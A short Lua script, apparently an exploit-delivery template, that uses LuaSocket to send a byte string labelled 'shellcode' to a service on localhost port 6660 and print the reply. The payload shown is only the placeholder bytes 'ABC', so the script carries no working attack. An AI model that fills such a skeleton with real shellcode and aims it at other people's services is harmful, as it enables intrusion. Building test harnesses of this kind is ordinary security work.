local socket = require("socket")

shellcode={
0x41,0x42,0x43
}

scoded=''
for i=1,table.maxn(shellcode) do scoded=scoded..string.char(shellcode[i]) end

xpl = socket.protect(function()
    local c = socket.try(socket.connect("localhost", 6660))
    local try = socket.newtry(function() c:close() end)
    try(c:send(scoded))
    local answer = try(c:receive())
	print (answer)
    try(c:send("good bye\r\n"))
    c:close()
end)

xpl()
